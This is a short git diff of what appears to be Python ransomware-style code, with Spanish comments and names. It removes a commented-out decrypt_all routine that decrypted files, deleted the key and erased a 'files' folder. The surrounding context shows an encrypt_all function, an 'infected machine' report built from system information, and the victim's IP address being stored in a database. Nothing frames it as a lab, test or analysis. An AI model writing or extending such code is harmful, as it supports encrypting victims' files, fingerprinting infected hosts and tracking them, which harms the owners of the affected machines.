@@ -139,29 +139,6 @@ def encrypt_all(application_path):
 
 
 
-'''
-
-def decrypt_all(application_path):
-    path_to_decrypt = os.path.join(application_path, "files")
-    key = cargar_key()
-
-    # Descifrar todos los archivos cifrados en la carpeta "files" del escritorio
-    desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
-    path_to_decrypt = os.path.join(desktop_path, "files")
-    for root, directories, files in os.walk(path_to_decrypt):
-        for file in files:
-            file_path = os.path.join(root, file)
-            decrypt([file_path], key)
-
-    # Eliminar el archivo de clave "key.key"
-    os.remove(os.path.join(application_path, "key.key"))
-
-    # Eliminar la carpeta "files"
-    shutil.rmtree(path_to_decrypt, ignore_errors=True)
-
-    print("Carpeta 'files' eliminada con éxito.")
-   
-'''
 
 
 def main():
@@ -214,8 +191,6 @@ def main():
                     for clave, valor in informacion_sistema.items():
                         archivo_infectado.write(clave + ': ' + str(valor) + '\n')
                 print("Archivo 'info_equipo_infectado.txt' creado con éxito en la carpeta 'files'.")
-                ip_address = informacion_sistema['Dirección IP']
-
                 ip_address = informacion_sistema['Dirección IP']
                 db.insert_data(ip_address)
                 
